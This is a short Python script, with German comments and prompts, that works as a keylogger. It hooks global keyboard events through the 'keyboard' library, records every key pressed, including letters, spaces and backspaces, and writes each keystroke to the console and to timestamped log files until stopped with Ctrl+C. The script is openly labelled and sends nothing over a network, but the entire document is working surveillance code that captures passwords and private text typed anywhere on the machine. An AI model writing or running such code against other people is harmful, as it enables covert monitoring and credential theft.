import keyboard
import os
import logging
import datetime

def setup_logging():
    log_dir = "log"
    if not os.path.exists(log_dir):
        os.makedirs(log_dir)
    
    current_datetime = datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
    log_filename = os.path.join(log_dir, f"Keylogger - {current_datetime}.log")

    logger = logging.getLogger("Keylogger")
    logger.setLevel(logging.DEBUG)

    formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')

    console_handler = logging.StreamHandler()
    console_handler.setLevel(logging.DEBUG)
    console_handler.setFormatter(formatter)
    logger.addHandler(console_handler)

    file_handler = logging.FileHandler(log_filename)
    file_handler.setLevel(logging.DEBUG)
    file_handler.setFormatter(formatter)
    logger.addHandler(file_handler)
    
    return logger
    
logger = setup_logging()

def record_keystrokes():
    recorded_keystrokes = ""
    prev_key = None
    while True:
        try:
            key_pressed = keyboard.read_event()
            if key_pressed.event_type == keyboard.KEY_DOWN:
                if key_pressed.name == "space":
                    recorded_keystrokes += " "
                    logger.info("Pressed : Space")
                elif key_pressed.name == "backspace":
                    if prev_key == "ctrl":
                        # Löschen der vorherigen Eingabe
                        recorded_keystrokes = recorded_keystrokes[:-1]
                        logger.info("Pressed : (Ctrl + Backspace)")
                    else:
                        # Löschen der letzten eingegebenen Taste
                        recorded_keystrokes = recorded_keystrokes[:-1]
                        logger.info("Pressed : Backspace")
                elif key_pressed.name.isalnum():
                    recorded_keystrokes += key_pressed.name
                    logger.info("Pressed : %s", key_pressed.name)
                else:
                    logger.info("Pressed : (%s)", key_pressed.name)
                prev_key = key_pressed.name
        except KeyboardInterrupt:
            break
    return recorded_keystrokes

if __name__ == "__main__":
    print("Drücke 'Strg + C', um die Aufzeichnung zu beenden.")
    recorded_keys = record_keystrokes()
    logger.info("Aufgezeichnete Tastatureingaben: %s", recorded_keys)
